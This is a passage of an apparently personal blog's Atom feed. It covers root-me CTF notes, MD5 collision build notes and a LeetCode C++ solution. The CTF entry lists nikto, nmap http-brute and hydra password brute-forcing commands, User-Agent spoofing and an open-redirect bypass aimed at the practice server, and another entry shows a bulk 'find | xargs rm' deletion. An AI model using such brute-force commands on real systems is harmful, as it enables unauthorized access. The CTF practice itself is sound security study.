class=&quot;line&quot;&gt;   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  _atexit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>web-server前四题</title>
    <link href="http://finsenty54.github.io/2020/12/20/web-server-front-4/"/>
    <id>http://finsenty54.github.io/2020/12/20/web-server-front-4/</id>
    <published>2020-12-20T05:41:40.000Z</published>
    <updated>2020-12-20T05:43:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Weak-password"><a href="#Weak-password" class="headerlink" title="Weak password"></a>Weak password</h1><h2 id="tNikto"><a href="#tNikto" class="headerlink" title="tNikto"></a>tNikto</h2><p>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。</p><p><code>nikto -host http://challenge01.root-me.org/web-serveur/ch3/</code></p><a id="more"></a><hr><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org</code></p><pre><code>-d: Increase debugging level-v: Increase verbosity level (use -vv or more for greater effect)--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of directories, script-files or script-categories--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</code></pre><hr><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p><code>hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ </code> </p><pre><code>- users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt- passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z</code></pre><h1 id="user-agent"><a href="#user-agent" class="headerlink" title="user-agent"></a>user-agent</h1><p><code>curl -L -A &quot;admin&quot; challenge01.root-me.org/web-serveur/ch2</code><br>     -A, –user-agent <name> Send User-Agent <name> to server<br>    -L, –location      Follow redirects</p><hr><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">resp = requests.get(<span class="string">&#x27;http://challenge01.root-me.org/web-serveur/ch2/&#x27;</span>, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Admin&#x27;</span>&#125;) </span><br><span class="line"><span class="built_in">print</span> resp.text</span><br></pre></td></tr></table></figure><h1 id="HTTP-open-redirt"><a href="#HTTP-open-redirt" class="headerlink" title="HTTP open redirt"></a>HTTP open redirt</h1><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><hr><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> Select a domain to <span class="built_in">hash</span> <span class="keyword">not</span> listed <span class="keyword">in</span> the page, like: https://google.com</span><br><span class="line"><span class="number">2.</span> Hash the string domain here <span class="keyword">or</span> another: http://www.fileformat.info/tool/<span class="built_in">hash</span>.htm</span><br><span class="line">3. Construct the url like this and press enter: http://challenge01.root-me.org/web-serveur/ch52/?url=##DOMAIN##&amp;h=##HASH##</span><br><span class="line"><span class="number">4.</span> When new page <span class="keyword">is</span> loading, you can see the flag, stop the redirection pressing escape <span class="keyword">and</span> copy it.</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Weak-password&quot;&gt;&lt;a href=&quot;#Weak-password&quot; class=&quot;headerlink&quot; title=&quot;Weak password&quot;&gt;&lt;/a&gt;Weak password&lt;/h1&gt;&lt;h2 id=&quot;tNikto&quot;&gt;&lt;a href=&quot;#tNikto&quot; class=&quot;headerlink&quot; title=&quot;tNikto&quot;&gt;&lt;/a&gt;tNikto&lt;/h2&gt;&lt;p&gt;Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件／CGIs；超过625种服务器版本；超过230种特定服务器问题。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nikto -host http://challenge01.root-me.org/web-serveur/ch3/&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="web-server in root me" scheme="http://finsenty54.github.io/categories/web-server-in-root-me/"/>
    
    
    <category term="web" scheme="http://finsenty54.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>md5快速碰撞</title>
    <link href="http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/"/>
    <id>http://finsenty54.github.io/2020/12/17/md5%E5%BF%AB%E9%80%9F%E7%A2%B0%E6%92%9E/</id>
    <published>2020-12-17T11:31:08.000Z</published>
    <updated>2020-12-17T11:45:13.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md5快速碰撞"><a href="#md5快速碰撞" class="headerlink" title="md5快速碰撞"></a>md5快速碰撞</h1><p><a href="https://github.com/Finsenty54/fast_collision">https://github.com/Finsenty54/fast_collision</a></p><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><p><a href="https://www.runoob.com/w3cnote/cpp-header.html">https://www.runoob.com/w3cnote/cpp-header.html</a><br>C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成<code>目标文件</code>后再与其他的目标文件做一次<code>链接</code>（link）就行了。</p><a id="more"></a><h3 id="条件编译"><a href="#条件编译" class="headerlink" title="条件编译"></a>条件编译</h3><h3 id="boost安装"><a href="#boost安装" class="headerlink" title="boost安装"></a>boost安装</h3><p><code>./b2 install </code>后</p><p>执行<code>sudo ldconfig</code><br>运行程序后就能加载共享库</p><p><em>程序运行结果</em></p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/essay!!!!!!!!!!/hash_collision/fast_collision]└──╼ $./first_try Generating first block: ........ 6.637388s wall, 6.620000s user + 0.000000s system = 6.620000s CPU (99.7%)</code></pre><hr><h3 id="查找后缀文件"><a href="#查找后缀文件" class="headerlink" title="查找后缀文件"></a>查找后缀文件</h3><pre><code>find -name &quot;*.txt&quot; | xargs rmxargs --helpUsage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre><hr><pre><code>find ./ -regextype posix-extended -regex &quot;.*\.(txt|bin)&quot; </code></pre><h3 id="vscodium调试"><a href="#vscodium调试" class="headerlink" title="vscodium调试"></a>vscodium调试</h3><p>注意在调试时需要在<code>makefile</code>文件中配置好debug（方法参考2.使用命令行调试大型程序部分），否则无法标记断点。</p><p><code>在生成对象文件时加 -g</code></p><h3 id="parrot-os安装中文输入法"><a href="#parrot-os安装中文输入法" class="headerlink" title="parrot os安装中文输入法"></a>parrot os安装中文输入法</h3><p><a href="https://parrotsec-cn.org/t/ibus-rime/3950">https://parrotsec-cn.org/t/ibus-rime/3950</a><br>ibus-rime</p><h3 id="函数常数是数组"><a href="#函数常数是数组" class="headerlink" title="函数常数是数组"></a>函数常数是数组</h3><p>C++ 传数组给一个函数，数组类型自动转换为指针类型，因而传的实际是地址。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;md5快速碰撞&quot;&gt;&lt;a href=&quot;#md5快速碰撞&quot; class=&quot;headerlink&quot; title=&quot;md5快速碰撞&quot;&gt;&lt;/a&gt;md5快速碰撞&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Finsenty54/fast_collision&quot;&gt;https://github.com/Finsenty54/fast_collision&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;C&quot;&gt;&lt;a href=&quot;#C&quot; class=&quot;headerlink&quot; title=&quot;C++&quot;&gt;&lt;/a&gt;C++&lt;/h2&gt;&lt;h3 id=&quot;头文件&quot;&gt;&lt;a href=&quot;#头文件&quot; class=&quot;headerlink&quot; title=&quot;头文件&quot;&gt;&lt;/a&gt;头文件&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.runoob.com/w3cnote/cpp-header.html&quot;&gt;https://www.runoob.com/w3cnote/cpp-header.html&lt;/a&gt;&lt;br&gt;C++ 语言支持”分别编译”（separatecompilation）。也就是说，一个程序所有的内容，可以分成不同的部分分别放在不同的 .cpp 文件里。.cpp 文件里的东西都是相对独立的，在编译（compile）时不需要与其他文件互通，只需要在编译成&lt;code&gt;目标文件&lt;/code&gt;后再与其他的目标文件做一次&lt;code&gt;链接&lt;/code&gt;（link）就行了。&lt;/p&gt;</summary>
    
    
    
    <category term="HASH" scheme="http://finsenty54.github.io/categories/HASH/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode longest_substring_without_repeating_characters</title>
    <link href="http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/"/>
    <id>http://finsenty54.github.io/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/</id>
    <published>2020-12-11T08:49:29.000Z</published>
    <updated>2020-12-11T08:51:36.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="longest-substring-without-repeating-characters"><a href="#longest-substring-without-repeating-characters" class="headerlink" title="longest_substring_without_repeating_characters"></a>longest_substring_without_repeating_characters</h2><p>这题用到了哈希表 和 滑动窗口</p><p>滑动窗口：<br>就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量</p><p>哈希表：<br>哈希表存着目前最长子组的值-地址对</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Solution::lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> begin=<span class="number">0</span>,end=<span class="number">0</span>,begin_new=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; windows;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//windows.insert(make_pair(s[i],i));</span></span><br><span class="line">        <span class="keyword">if</span>(windows.count(s[end])==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//有重复值，那么获得目前的最大值</span></span><br><span class="line">            <span class="keyword">if</span> (end-begin&gt;count || count==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=end-begin;</span><br><span class="line">            &#125;</span><br><span class="line">            begin_new=windows[s[end]]+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//delete </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = begin; i &lt; begin_new; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                windows.erase(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//插入新的重复值</span></span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">            begin=begin_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end-begin&gt;count)</span><br><span class="line">    &#123;</span><br><span class="line">        count=end-begin;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> count;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/rAyOUO"><img src="https://s3.ax1x.com/2020/12/11/rAyOUO.jpg" alt="rAyOUO.jpg"></a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;longest-substring-without-repeating-characters&quot;&gt;&lt;a href=&quot;#longest-substring-without-repeating-characters&quot; class=&quot;headerlink&quot; title=&quot;longest_substring_without_repeating_characters&quot;&gt;&lt;/a&gt;longest_substring_without_repeating_characters&lt;/h2&gt;&lt;p&gt;这题用到了哈希表 和 滑动窗口&lt;/p&gt;
&lt;p&gt;滑动窗口：&lt;br&gt;就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量&lt;/p&gt;
&lt;p&gt;哈希表：&lt;br&gt;哈希表存着目前最长子组的值-地址对&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
</feed>
